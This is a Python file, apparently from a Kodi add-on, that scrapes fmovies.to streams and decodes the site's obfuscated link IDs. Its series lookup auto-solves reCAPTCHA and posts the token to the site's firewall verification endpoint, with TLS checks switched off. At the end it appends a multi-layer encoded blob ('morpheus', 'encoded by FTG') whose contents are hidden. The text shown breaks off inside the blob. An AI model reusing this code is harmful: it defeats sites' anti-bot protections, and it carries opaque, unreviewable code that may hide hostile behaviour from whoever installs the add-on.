    reg = '?sub.info='
    reg = reg if reg in link2 else '?subtitle_json='

    link,subt = link2.split(reg)
    
    
    subsout=[]
    subtx = unquote(subt)
    subt = False
    if subtx:
        response = sess.get(subtx, headers=headers, verify=False).json()

        for subtitle in response:
            subt = subtitle.get('src',None)
            subt2 = subtitle.get('file',None)
            subt = subt if subt else subt2
            label = subtitle.get('label',None)
            subsout.append({'label':label,'subt':subt})
    if wybornapisow and subsout:
        labels = [x.get('label') for x in subsout]
        sel = xbmcgui.Dialog().select('Subtitle language',labels)   
        if sel>-1:
            subt=subsout[sel].get('subt')
            if subsout[sel].get('label') == 'Polish':
            
                subt = napisy if transPolish(subt) else subt
                
        else:
            subt = False

    if 'mcloud' in link2 or 'vizcloud' in link2:

        pattern = r'(?://|\.)((?:my?|viz)cloud\.(?:to|digital|cloud))/(?:embed|e)/([0-9a-zA-Z]+)'
        hostm_id = re.findall(pattern,link,re.DOTALL)
        #

        if hostm_id:
            media_id = hostm_id[0][1]
            host = hostm_id[0][0]
            med_id = vidcloud_deco(media_id).replace('=','').replace('/','_')

            link = re.sub('/(?:embed|e)/','/info/',link2).replace(media_id,med_id.replace('=','').replace('/','_'))
        stream_url = ''
        try:
            response = sess.get(link, headers=headers, verify=False).json()
            outz=[]
    
            if 'success' in response:
                if response.get('success',None):
                    srcs = response.get('media',None).get('sources',None)
                    for src in srcs:
                        fil = src.get('file',None)
                        if 'm3u8' in fil:
                            stream_url = fil+'|User-Agent='+UA+'&Referer='+link2
                            break
            elif 'status' in response:
                if response.get('status',None) == 200:
                    srcs = response.get('data',None).get('media',None).get('sources',None)
                    for src in srcs:
                        fil = src.get('file',None)
                        if 'm3u8' in fil:
                            stream_url = fil+'|User-Agent='+UA+'&Referer='+link2
                            break
        except:
            pass
    
    
    

    else:
        
        stream_url = resolveurl.resolve(link)
    if stream_url:
        play_item = xbmcgui.ListItem(path=stream_url)
    
        if subt:
            play_item.setSubtitles([subt])
        xbmcplugin.setResolvedUrl(addon_handle, True, listitem=play_item)

def DecodeLink(mainurl):

    ab=mainurl[0:6]   #23.09.21
    ac2 = mainurl[6:]   #23.09.21

    
    
    
    ab = 'DZmuZuXqa9O0z3b7'
    ac= decode2(mainurl)

    link = dekoduj(ab,ac)
    link = unquote(link)
    return link

#def getFileJson():
#   with xbmcvfs.File(jfilename) as f:
#       jsondata = json.loads(f.read())
#   html =   jsondata.get('html',None)
#   return html


    
    
def getFileJson():

    from contextlib import closing
    from xbmcvfs import File
    
    with closing(File(jfilename)) as f:
        jsondata = f.read()
        
    jsondata = json.loads(jsondata)

    html =   jsondata.get('html',None)
    return html


def getLinksSerial(hrefx):
    try:
        sez,ep = hrefx.split('-')
    except:
        sez,ep,sh = hrefx.split('-')
    a=''
    
    htmlx =  getFileJson()
    href = re.findall('href="([^"]+)',htmlx)[0]
    href = 'https://fmovies.to'+href if href.startswith('/') else href
    
    
    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    
    result = parseDOM(html, 'section', attrs={'class': "info"})[0]  
    plot = parseDOM(result, 'div', attrs={'itemprop': "description"})
    
    mname = parseDOM(result, 'h1', attrs={'itemprop': "name","class":"title"}) # = <h1 itemprop="name" class="title">
    mname = mname[0] if mname else ''
    plot = mname+'[CR]'+plot[0] if plot else ''
    imag = parseDOM(result, 'img', ret='src')#[0]
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''
    
    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
    
    countries = re.findall('Country\:(.+?)<\/div>',result) # 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''
    
    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''
    
    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''
    
    yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
    yr = yr[0].strip().split('-')[0] if yr else ''
    infol = {'plot':PLchar(plot),'genre': genre,'country':country,'duration':tim,'year':yr}
    
    servid = 1
    try:
        href1,serwery = re.findall("""href="([^"]+)"\\n\s*data-kname="%s".*?data\-ep=\\'({.*?)}"""%(hrefx),htmlx,re.DOTALL)[0]
    except:
        servid = 0

    href = 'https://fmovies.to'+href1 if href1.startswith('/') else href1

    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',htmlx,re.DOTALL)
    
    
    
    
    
    
    
    
    nazwax = '- '+nazwa if mname else nazwa
    
    for linkid1,host in linki:
        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
    
        linkid = re.findall(linkid1+'"\:"([^"]+)',serwery)#[0]
        if linkid:
            add_item(name=PLchar(tyt), url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    
    
    
    
    
       
#   for serv,linkid,href in servid :
#   
#       href = 'https://fmovies.to'+href if href.startswith('/') else href
#   
#       nazwax = '- '+nazwa if mname else nazwa
#       host = re.findall('data-id="%s".*?>(.+?)<'%str(serv),servers,re.DOTALL)[0]
#       tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
#       add_item(name=tyt, url=linkid+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    #if len(servid)>0:
    if servid:
        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle) 
    else:
        xbmcgui.Dialog().notification('[B]Błąd[/B]', 'Brak materiałów do wyświetlenia',xbmcgui.NOTIFICATION_INFO, 8000,False)

def ListEpisodes(exlink):

    links= getEpisodes(exlink)  
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getLinksSerial', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getEpisodes(href):
    seas,serv = href.split('|')

    html =   getFileJson() 

   # episodes = re.findall('data-season="%s"(.*?)<\/ul>'%str(seas),html,re.DOTALL)[0]

    
    episodes = parseDOM(html,'div', attrs={'class': "episodes",'data\-season': str(seas)})[0] 
    
    
    
    out=[]

    #<div class="episode">
    epizody = parseDOM(episodes, 'div', attrs={'class': "episode"})#[0] 
    for epi in epizody:
    
   # for kname,title in re.findall('data-kname="([^"]+).*?>(.+?)<\/',episodes,re.DOTALL):
        kname = re.findall('data\-kname="([^"]+)',epi,re.DOTALL)[0]

        try:
            sez,epis = kname.split('-')
        except:
            sez,epis,sh = kname.split('-')
        seas = 'S%02d'%int(sez)
        try:
            episod = 'E%02d'%int(epis)
        except:
            episod = 'E-%s'%str(epis)
        title = re.findall('class="name">([^<]+)',epi,re.DOTALL)#[0]
        if title:
            title = re.sub("<[^>]*>","",title[0].strip())
        else:
            title = nazwa.split('-')[-1]
        title = title+' ('+seas+episod+')'
        out.append({'title':PLchar(title) ,'href':kname,'img':rys})

    return out
def ListSeasons(exlink):

    links= getSerial(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getEpisodes', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getSerial(href):

    out=[]
    href,id = href.split('|')

    headers.update({'Referer': href})

    recap =      addon.getSetting('cap_token')
    if not recap:
    
    
        recap="03AGdBq25eDJkrezDo2y"
 
    verid = getVerid(id)    
    params = (
        ('id', id),
        ('vrf', verid),

    )

    response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, verify=False)#
    
    html = (response.content)

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')
 
    if 'sitekey=' in html:

        sitek=re.findall('data\-sitekey="(.+?)"',html)[0]

        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')

        data = {
                'g-recaptcha-response': token}
        
        response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)#
        
        params = (
            ('id', id),
            ('token', token),
        )
        response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)#
    
        
    jsondata = response.json()

    with io.open(jfilename, 'w', encoding='utf8') as f:
        str_ = json.dumps(jsondata,
            indent=4, sort_keys=True,
            separators=(',', ': '), ensure_ascii=False)
        f.write(to_unicode(str_))

    html = jsondata.get('html',None)
    

  #  sezony = parseDOM(html, 'ul', attrs={'class': "seasons"})[0]
  #  sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)
    sezony = parseDOM(html, 'div', attrs={'id': "seasons"})[0]
    
    

    sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)

    for sez in sezonyx:

       # sesid,servers,title = re.findall('data-id="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
     #   sesid,servers,title = re.findall('data-number="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
        

        sesid = re.findall('value="([^"]+)',sez,re.DOTALL)[0]
        title= re.findall('>([^<]+)<span',sez,re.DOTALL)[0]
        servers = ''
        out.append({'title':title.strip()+nazwa,'href':sesid+'|'+servers,'img':rys})
    return out
    

try:
    import string
    STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    #CUSTOM_ALPHABET =   "5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"   #23/05/22
    CUSTOM_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='

    ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)
except:
    STANDARD_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    #CUSTOM_ALPHABET =   b"5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"  #23/05/22
    CUSTOM_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='
    
    
    ENCODE_TRANS = bytes.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = bytes.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)

    
    
    
def encode2(input):
    return base64.b64encode(input).translate(ENCODE_TRANS)
def decode2(input):
    try:    
        xx= input.translate(DECODE_TRANS)
    except:
        xx= str(input).translate(DECODE_TRANS)
    return base64.b64decode(xx)

def vidcloud_deco(media_id):
    try:
        import string
     #   STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
     #   CUSTOM_ALPHABETx =   '0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG='  #23/05/22
        CUSTOM_ALPHABETx =   "51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
    
        ENCODE_TRANSx = string.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = string.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    except:
       # STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
      #  CUSTOM_ALPHABETx =   b'0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG=' #23/05/22
        CUSTOM_ALPHABETx =   b"51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
        
        
        ENCODE_TRANSx = bytes.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = bytes.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    
        
        
        
    def encode2x(input):
        return base64.b64encode(input).translate(ENCODE_TRANSx)
    def decode2x(input):
        try:    
            xx= input.translate(DECODE_TRANSx)
        except:
            xx= str(input).translate(DECODE_TRANSx)
        return base64.b64decode(xx)
    
    
    

    try:
        media_id = encode2x(media_id)
    except:
        media_id = encode2x(media_id.encode('utf-8')).decode('utf-8')
   # seed = 'LCbu3iYC7ln24K7P'  #23/05/22
    seed = 'dOuhV3IsSvf7jeI5' #28/05/22
    
    
    
    
    
    
    #
    array_list = list(range(0, 256))
    
    j = 0;
    
    pix_color = "";
    
    length = 256;
    
    i = 0;
    for i in range(length):
    
        j = (j + array_list[i] + ord(seed[i%len(seed)]))%length
    
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
    j = i = 0;
    
    index = 0;
    for index in range(len(media_id)):
    
        i = (i + index) % length
        j = (j + array_list[i]) % length;
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
        if sys.version_info >= (3,0,0):
            try:
                pix_color += chr((media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
            except:
                pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
        
        else:
            pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )

    if sys.version_info >= (3,0,0):
        pix_color=pix_color.encode('Latin_1')

    pix_color = encode2x(pix_color)

    if sys.version_info >= (3,0,0):
        pix_color = pix_color.decode('utf-8')

    return pix_color;
    
    
#function av(n, t) {
#    var r = _0x450c;
#    for (var i, u = [], e = 0, o = r7, c = 0; c < 256; c++) u[c] = c;
#    for (c = 0; c < 256; c++) e = (e + u[c] + n[K4 + e4 + s4](c % n[ii])) % (256), i = u[c], u[c] = u[e], u[e] = i;
#    for (var c = 0, e = 0, f = 0; p.rdOti(f, t[ii]); f++) e = (e + u[c = p[r(1086) + "Dg"](c, 1) % (256)]) % (256), i = u[c], u[c] = u[e], u[e] = i, o += A3[e5 + qt + e4](t[K4 + e4 + s4](f) ^ u[p.AXpPG(u[c] + u[e], 256)]);
#    return o;
#}
    
def dekodujNowe(t,n): #16.08.21
    #n = encode2(n)
    r=[]
    i=[]
    u=0
    x=''
    c = 256
    for o in range(c):
        i.append(o)
    o=0

    for o in range(c):
        #u = (u + i[o] + t.charCodeAt(o % t.length)) % c
        u = (u + i[o] + ord(t[o%len(t)]))%c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    e = 0
    u = 0
    o =0
    for e in range(len(n)):
    #e+=1
        o = (o + e) % c
        u = (u + i[o]) % c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    #x += String.fromCharCode(n.charCodeAt(e) ^ i[(i[o] + i[u]) % c])
        if sys.version_info >= (3,0,0):
            try:
                x += chr((n[e])^ i[(i[o] + i[u]) % c] )
            except:
                x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
        else:
            x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
    return x


def dekoduj(r,o):

    t = []
    e = []
    n = 0
    a = ""
    for f in range(256): 
        e.append(f)

    for f in range(256):

        n = (n + e[f] + ord(r[f % len(r)])) % 256
        t = e[f]
        e[f] = e[n]
        e[n] = t

    f = 0
    n = 0
    for h in range(len(o)):
        f = f + 1
        n = (n + e[f % 256]) % 256
        if not f in e:
            f = 0
            t = e[f]
            e[f] = e[n]
            e[n] = t

            a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])
        else:
            t = e[f]
            e[f] = e[n]
            e[n] = t
            if sys.version_info >= (3,0,0):
                #a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])
                
                try:
                    a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr((n[e])^ i[(i[o] + i[u]) % c] )
                except:
                    a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
                
                
                
                
                
                
                
            else:
                a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])

    return a

def PLchar(char):
    if type(char) is not str:
        char=char.encode('utf-8')
    char = char.replace('\\u0105','\xc4\x85').replace('\\u0104','\xc4\x84')
    char = char.replace('\\u0107','\xc4\x87').replace('\\u0106','\xc4\x86')
    char = char.replace('\\u0119','\xc4\x99').replace('\\u0118','\xc4\x98')
    char = char.replace('\\u0142','\xc5\x82').replace('\\u0141','\xc5\x81')
    char = char.replace('\\u0144','\xc5\x84').replace('\\u0144','\xc5\x83')
    char = char.replace('\\u00f3','\xc3\xb3').replace('\\u00d3','\xc3\x93')
    char = char.replace('\\u015b','\xc5\x9b').replace('\\u015a','\xc5\x9a')
    char = char.replace('\\u017a','\xc5\xba').replace('\\u0179','\xc5\xb9')
    char = char.replace('\\u017c','\xc5\xbc').replace('\\u017b','\xc5\xbb')
    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace("&gt;",">") 
    char = char.replace("&Iacute;","Í").replace("&iacute;","í")
    char = char.replace("&icirc;","î").replace("&Icirc;","Î")
    char = char.replace('&oacute;','ó').replace('&Oacute;','Ó')
    char = char.replace('&quot;','"').replace('&amp;quot;','"')
    char = char.replace('&bdquo;','"').replace('&rdquo;','"')
    char = char.replace("&Scaron;","Š").replace("&scaron;","š")
    char = char.replace("&ndash;","-").replace("&mdash;","-")
    char = char.replace("&Auml;","Ä").replace("&auml;","ä")

    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace('&#8222;','"').replace('&#8221;','"')   
    char = char.replace('[&hellip;]',"...")
    char = char.replace('&#038;',"&")   
    char = char.replace('&#039;',"'")
    char = char.replace('&quot;','"')
    char = char.replace('&nbsp;',".").replace('&amp;','&')
    
    
    
    char = char.replace('Napisy PL',"[COLOR lightblue](napisy pl)[/COLOR]")
    char = char.replace('Lektor PL',"[COLOR lightblue](lektor pl)[/COLOR]")
    char = char.replace('Dubbing PL',"[COLOR lightblue](dubbing pl)[/COLOR]")   
    return char 

    
import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDc2NGQ2ZDRmMzYzODcxNTM0YzU0NjcyZjc3NTA2ZDQ4NDMzNzdhNDI3OTYzNTI0YzQ2NGU2ODQ5Mzg2MjYxNDE3OTY3NGI2Zjc3MzgzNDcwNzU2ODU0NzM2NzY5NGI1MjQ1MzQ2YzYyNmY1MjQxNmM1MzcxNTI3NTRkNGU2ODM4MmY2MjRlNmM0ODc2NzY2Mzc2NDY2YzVhNjg1MjcyNTU1OTQ1NGU0MjY5NTg1MzM2NTczNzUwNGQ3YTQ3MzMzNTJmNjgzOTJmNGYzOTMyNzI3ODM4MmY1NDdhMzczODY0NzAzOTM5MmYyYjc4MzkyZjYzMzE1MDc2MzkzOTM5MmIyZjJiMzM1Mzc0NDkyZjZlMzUzOTJiNGY2ODM3MmI2NjU4Njg2MjJmMzk2YTY2NjM1NTY2MzMzOTM5MzkyYjYxNzgzNzUwMzk0ZjUwNTYyZjJmMzk3NTJmMmYyYjMwNTA0ZDYxMzE3Njc4MzI2MjM3NTY1ODcwNzY1NjJiNDU0NjUzN2E3NDM2MzE0ZDQ5NzA3MzMzNmE1MTRlNmU2MjU1NzQ3MzY2MzkyYjcxNzUzNjUyMmI2NTY5NjM2NTYzNzk0YzYyNTQ3NzdhMmY1ODRjMzA2Mjc0NjQzNjRjNGQyYjQ3NzY0Nzc0NGQ0ZjU4NjYzNjYyNmUzMjUzNGMzODU4Nzg3MTMyNmM1YTdhMzY1MDVhNmE0MTYzNzY0NDY1Mzk2ZDcxNzk1NjJiNGM0ZDc5NzQ2ZDZlMzg3MzVhMzI3NjM1NzQ1OTc1NjQ0NDZiMzc1MjZkNmM2ZTY3MzY1MzM3NjkzNzZjNTkzMDc1NjUzODU0NjI1MDQ2NjQ2ZjM2MzA2ZjY3MzQ3NTMyMzE1NDRkNzU3YTUzNjI3NDMzNGU2ZDYyNDc2NTM1MzM0ZjYxNGY0YjU3MzMzODQ4NWE2Yjc5NGM2NjUyNzQ2NTc0NTg2YjRjNGM1Nzc0MzUzODdhNjI1Nzc0MzE1ODdhNGY1ODQ4MzkzMzMwMzA2ZTcwNmE0YjZkNzEzNzc0Njk0ZTM0NjIzMDU0NzU0Njc1NTU3NTRjNjM2NDczNTUyYjczMzY1NzY5MzYzMTRlN2EzNjYyNTI2MzZjNzM0YzU0NjE2MjU2Njc3NTM3NTg2OTdhNTM2MTc0NzI1YTQ0Mzk3ODY2MzA2ZTZkNGI2ZDM5MzI2YTYyMzI2YTQ3NGM2YzRmNTkyYjU4MmI2YjM2NzY3NDQ2MzQyYjcyNjE3NTcwNmQzMTM2NzA3NjZkNTc3YTU4NjEzMjY0NDY2ZTU0NjMyZjU4NWEzMzRlNTk1OTRjMzg0OTZlMzE2YjQ4NmEzMDUxN2E2ZTczMzA0NzY2NTMzOTZiNDk3MjYxNzc0YzdhNGE2ZTZkNDU1Njc4NmI1MTJiMmI2ZjRkMzc3MjQ3NzU0YzUyNjU3MjM2NDQzNTQ2NzI2OTY2NTA2ZjRlNmQ1NzMwNzQ0NDdhNjg1ODM5NGYzMDRkNGY2NDQ2MzgzMTQ2NTQ1ODRlNzY3OTU5NWEzMTQxNTYyYjc3N2E3MDRhNmE2YzY1MzY3ODZlNzU3NTRkMzYzMTRhNzgzMjJmMzA1MDY3MzI2NjYxNmU3OTRjNmU3Mzc0NDc1NzZmMmI0YTJiMzA2NzRmMzk0Mjc1NGU3YTM5NjY1YTczNDUzMDc0NjU2ZTJiMzI3NzQxNjczMDRjMmY3MDY1NmI0Yjc4NDkzMzcxNmU0NjM4MzkzNDMyMzk0ZDc3NjM0ZTQ0NTQyZjY1NTc2NDU4NTA0OTM2NjMzMzdhMzczNDc2NTQ2MjRhNjQ3OTYyMzUzMTZhMzgyZjc0NjgzNjc2NmQyYjVhNmEzMDYyNzk2NzM2MzA3MjYyMzQ3NjM1NTUzNjRlNDk2ZDRmNjQ3MjUzMzU0ZjM5NmY0ODRhNzI2MjUyNDg3MTU5NTM1NzM0MzA1MjZmNjIzMTRjNTc0MTUwNjM3MzM0Nzc2MjMzNmY2NjZhNTc2NDU4NGE0OTY1NGQzNTRhNzI3MDUwNDYzODc2NGQyYjZhMzk3OTM2MzE0MjJiNzI0ODRhNDI2ODcxNzM0MTMzNzE1MjQ3NDUyZjY2NGU3NjY4NjUzMDc0Nzc2YjY2NTY2NjcwNzU0NzM5NmU0Njc5NTA0YTZhMmY1MTRlNzUzNjQ2MzU0YjdhMzI1OTRlNGQzNTQ1NzYzOTRlMzc3OTRmMzY2NzQyNzg3NTc5Njg3MjM0Nzg1MDJiNjk2MjM1NmM0NDU0NzY0ZDZiNTc0YTY1Nzc1NjY0NmI0NjMyNTYzNjUyNzg2YTYyNDYzMzM5NzMzODUwNjU2ZjM3NzM0NjQ2NGI0NDcyNDc2ZDY0NTQ1NTU0Nzk2ZjU4NTg0ZjczNDczMTM2NDg3NTc1N2E0YjM3NGI1MjRkMzQzMTUwMzgyZjUxNmI2NjU2MmY1NzY0NDIyZjVhNDI1NzUyMzQ0YTYyMzE1NTQ5MzkzNzUwMzk2YjUwMzYzMjJiNDgzOTQ4NzU3NzU5NjM2ZTVhNmY2ZTcyNjc2NjY0NzA2ZDVhNjQ0NzMwNTU3MzQ0NzU3OTYyMzc0YTZhNmIzODU5Njg0ZjYyMzkzOTYyNDY0ZjYxNjUzMDcwNzkzODU4Njc3NTUzMzU1YTMzNDc3NDQ1Mzg0OTQ5NzQ2OTY5NTUyYjUzNGQ1NDMxNjYzMDU4Njk1MTU5Nzc0NjM3MzQ0YzU3NTY2NDZkNTc3OTJmNjQ1ODZjNjQ1MTczNWEzMTYyNjk1MDM3NDk0NDczNjk0ZjUyNDUzODc5NGIyZjM4Njk0MTQ4NTM1ODM1NGI2NjY3NTgyZjY4NTgyZjQyNDI3MzZlNjY1MzcwNDk2MjcyNTEyZjUwMzY0NzUxMzM0YTQ1NTAzNjU0NDM3NjM0NGEzNjMzNDgzNDc0Mzk2ODRhNzc1NzY1NzE3OTUwNTkzNTc3NmEyZjZjN2E1MDRhNmI1NzMyNmM1NTZhNWE2YTczMzkyZjRmNjI0MzRlNzMzMjM5NDEzNTM1NDU3OTM2NDk1Mjc5NTE0YjY0NmI0NDc2NTk2NjM5Nzg0NjYyMzI1MjJmNGY2YzY0MzU0NTY2NTE2NDM1MzI2NjQ5NTcyZjczNTAzOTM1NDI2MjMyNTg3ODc2NjU2OTQ3NjIzOTc0NTUzMDY0NmEyYjM2Njc0YzM1NTI0ZDdhMzY1MzMyNGU0ZDQ2MmY0OTM5Nzc3MDYyNDE2ODM2NTI2NjcxNDUyZjZkNmU2MzQ2NjU2NDU0NTE0ODM2MzE2YzZmNzY1NTYyNGE0NzJmNDk1MTc5NzQ2ZDM4NmUyYjc2NDk0NDczNjc3Njc5NjU2NjVhNGMzMzU3NjI0NzM4NjEzNTQ2NTY0MzM3NzU2ZDVhMmY0NDc3NmQ3Mjc5NDY1YTRkNzQzNTQxNjI2ZTQ5NjcyZjU3NDI3NDUzMzc2MTQ0NDY0ODU5Njg2ZjQxNjUzNjQyMmY1YTQ3NjQ3MDM0NGI2NzJiMzI2NTM3NGM2NTQ1NmUzOTQ5NDkzODZjNzQ1MDMyMzMyZjU5NDI2MTMwNzA0OTZlMzE0NDc0MzU0MjYyNTQ0ODY1NTM2ZTRmNDg0ODM4NDM0ZDM3NTk3NjM4Njg2NTM2NGM1MDQzNDY2OTM1Njc0ODMyNTY0YTQ4MmI1MzRlNjY0MjMxNzE2Njc3NTE0ZjQ2NTY3MDRmMmY2NzMzMzY2MTY5NDU2ZTQyNzYyYjZlNzY0NTQ1NjM3MzY1MzQ3NzQ3NDg3OTQ4Nzg2ZjRjNjM3YTJmNTQ0ZjQzNTM1MDY4NzU1MzRhMzkzMjRlNjM3OTQ4NTcyYjZiNjgzMjUyNzY0NzcxNzAzNzM5Njk3NTRkNTgzOTY3NDE2NTQ2N2E2OTc1NjU0MTU3Nzc0NjU3NTEzNTM5NmI0MTMyN2E2ZTM5NGE2YzYxNzM0NTJmMzY0MjJmNzg2ZDMzNDM0MTY0NmI1NDM0NjEzMjQyMmY3MDQ2NmU2MTU3NDk2YTM3Njc2NTY1NDQ3OTZkNjU1NjQyMzg3NDQ4NDk1MDZkNjY2ZjUxMzk1YTZiNTQ3NzMxNzM1NDM4NGIyYjRlNjI1YTY4MzQ0MTc2Nzc2ZTY2Nzk0MTc2NmM3MzcxNzY0MzYzMzc1NTM1MmY0MTVhNjY0YjY2NjE2YzYxMzQ1ODc3NDE2ZTRkNDIyZjZhNDczNTY0NDc2ODU2MmI0ZDQ1Nzk1MTU4MmI0MjU4NWE0NDYzMzA0NDc1NGQ3NjcyNDk2ZDc5NmMzNTMwMzM0ZDQ4MmY1OTQ4NjUzMjY2Mzc2MjM4Njc2NTYzNDQzMTZlNWE0YjJiNmI1MDMwMzk0MzU4Mzg0MjQyNzM2YjQ3NjE3NDc4MzM0Mjc2Nzg0NjYyNzk0OTM2Njc1YTMzNzg1MDMxMzAzMTQ1MzkzMDQ4MzI3MzQ2NTA0YTRlNmM1NTQzNGU3YTMzNmY2YjJiNGE2ODQ0NTg3NjRhNTM0NTM0MzA2MjczMzM3MjZmNjY3NjY3MzkzOTQxNzYzNjU5NmU3NzZhNGY1MzQxNzU0NTU4NmE1MTY3NWE1MzQ5MzMzMjU0NDY0MjMxNGU3ODUyNGY3OTQ3NTQ3MzQzN2E3NDQxNjMzMjRmMzc2ZjRmMzc0YTY2MmIzNDc3Nzg0MjJmNjIzNTU3NzM1NTUyNzI0ZjM4Mzc0YzZmMzI1MzM1NTU0ODM2NDk0ODc3NzAzNDUzMzg1NTRhMzA2ODMyNDkzODY0NmMzNjQ3NjY0ZjY3NGQzODM2NzgzMDRkNjI2MzZlNDQ2ZjQ4NzQ0YTQ4Mzc1YTQyNjM0YjY1MzQzMDQyNjM2MzczNDc2YzY1NDg2MjYxNzAzNTZiMzEyYjUzMmY0MzU0NGU0ODJmNGQ2ZDc1NjQ0NzM4NzI3ODcyMzc0ZjY2NDEzMDRhNjIzMzUyNmQ0MTU4NzM2